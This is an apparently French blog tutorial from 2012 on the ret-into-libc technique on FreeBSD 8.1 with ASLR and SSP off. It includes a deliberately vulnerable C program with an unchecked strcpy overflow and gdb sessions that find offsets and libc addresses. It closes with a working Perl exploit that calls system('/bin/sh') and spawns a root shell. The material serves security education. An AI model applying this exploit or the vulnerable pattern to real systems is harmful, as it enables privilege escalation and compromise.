Title: Ret into Libc
Date: 2012-01-28
Category: App
Tags: ret into libc,overflow,exploitation
Author: Tosh
Summary: Return into libc : basics

Dans cet article, je vais décrire brièvement comment exploiter un programme en utilisant la méthode de ret into libc. Ceci a été testé uniquement sur FreeBSD 8.1, sans ASLR, et sans SSP d'activé.

Prenons le programme vulnérable suivant :

	:::c
	#include <string.h>
	#include <stdio.h>

	void foo(char *buff)
	{
    	char buffer[100];
    	strcpy(buffer, buff);
	}
	
	int main(int argc, char **argv)
	{
    	if(argc != 2)
    	{
        	printf("Usage : %s \n", argv[0]);
        	return 0;
    	}
    	foo(argv[1]);
    	return 0;
	}

Nous avons donc un stack overflow dans la fonction foo. Nous savons que nous écrasons EBP après 100 caractères copiés, et EIP après 104 caractères.

Pour être sûr, testons :

	:::console
	(gdb) r `perl -e 'print "A"x100 . "BBBB" . "CCCC";'`
	Program received signal SIGSEGV, Segmentation fault.
	0x43434343 in ?? ()
	(gdb) i r ebp eip
	ebp            0x42424242     0x42424242
	eip            0x43434343     0x43434343

Nous avons donc bien écrasé EBP avec les 'B' et EIP avec les 'C'. Le principe du ret into libc, est qu'au lieu de jumper sur un shellcode en STACK ou présent dans une variable d'environnement, nous jumpons sur une fonction de la bibliothèque C.

Le plus simple, étant de sauter sur la fonction system, nous pourrons alors exécuter la commande de notre choix. Pour se faire, il faudra écraser EIP, avec l'addresse de la fonction system située dans le programme vulnérable, en lui transmettant l'addresse où sera situé notre chaine à exécuter.

En connaissant un peu comment fonctionne les appels de fonctions en C, nous savons que system() ira chercher l'addresse de la chaine 4 octets plus haut sur la pile au moment de l'appel, le sommet de la pile étant EIP empilé par l'instruction CALL.

Une manière propre de faire, étant de placer l'addresse de exit entre l'addresse de system() (Qui écrase EIP), et l'addresse de notre commande. Ainsi, le programme fermera proprement au retour de la fonction system. (Car system jumpera sur l'adresse située sur le sommet de la pile, pensant qu'elle a été appellée grâce à l'instruction CALL).

Notre stack ressemblera donc à ceci :

    :::console
	[     BUFFER     ]
	[     BUFFER     ]
	[      ...       ]
	[     BUFFER     ]
	[ Adresse system ]
	[  Adresse exit  ]
	[Adresse commande]
	[   Commande     ]
	[   Commande     ]
	[   Commande     ]

Pourquoi mettre la chaîne de l'argument de system APRÈS les adresses, et pas dans le buffer ? Car cette chaîne a besoin du caractère final '\0', hors si on le met au début, strcpy arrêtera la copie, et nous ne pourrons pas exploiter notre programme.

Le risque, étant d'écraser des données utiles à l'exploitation. Récupérons les adresses de system et exit :

	:::console
	[tosh@sys-tosh /usr/home/tosh/Desktop]$ gdb vuln
	GNU gdb 6.1.1 [FreeBSD]
	Copyright 2004 Free Software Foundation, Inc.
	GDB is free software, covered by the GNU General Public License, and you are
	welcome to change it and/or distribute copies of it under certain conditions.
	Type "show copying" to see the conditions.
	There is absolutely no warranty for GDB.  Type "show warranty" for details.
	This GDB was configured as "i386-marcel-freebsd"...(no debugging symbols found)...
	(gdb) b main
	Breakpoint 1 at 0x8048470
	(gdb) r
	Breakpoint 1, 0x08048470 in main ()
	(gdb) x exit
	0x28101920 :  0x53e58955
	(gdb) x system
	0x280ad870 :  0x0001b855

Nous avons donc :

	:::console
	system : 0x280ad870
	exit   : 0x28101920

Le plus dur, reste de trouver l'adresse de la chaine.

Exécutons le programme, et tentons de trouver le début de la chaîne :

	:::console
	(gdb) r `perl -e 'print "A"x108 . "BBBB";'`
	Program received signal SIGSEGV, Segmentation fault.
	0x41414141 in ?? ()
	(gdb) i r $esp
	esp            0xbfbfe9c0     0xbfbfe9c0
	(gdb) x/s $esp
	0xbfbfe9c0:    "BBBB"

Nous avons notre chaîne ! Avec le shéma de la stack précédente, nous savons que notre chaine sera située 8 octets plus loin dans la stack, soit a l'adresse 0xbfbfe9c8

Nous pouvons donc écrire notre exploit :

	:::perl
	#!/usr/bin/perl
	use strict;

	my $system_addr = "\x70\xd8\x0a\x28";
	my $exit_addr = "\x20\x19\x10\x28";
	my $cmd_addr = "\xc8\xe9\xbf\xbf";
	my $cmd = "/bin/sh";

	my $buff = ("A"x104) . ($system_addr). $exit_addr. $cmd_addr.$cmd;

	print "[*] Inj3ct code...\n";

	exec("./vuln", $buff) || die("Can't exec file\n");

Comme vous le savez, sur un système LITTLE_ENDIAN, il faut écrire les adresses "à l'envers", les octets de poids faibles étant à gauche, et ceux de poids fort à droite.

Lançons l'exploit :

	:::console
	[tosh@sys-tosh /usr/home/tosh/Desktop]$ perl test.pl
	[*] Inj3ct code...
	# id
	uid=1001(tosh) gid=1001(tosh) euid=0(root) groups=1001(tosh),0(wheel)
	#

Et voilà.
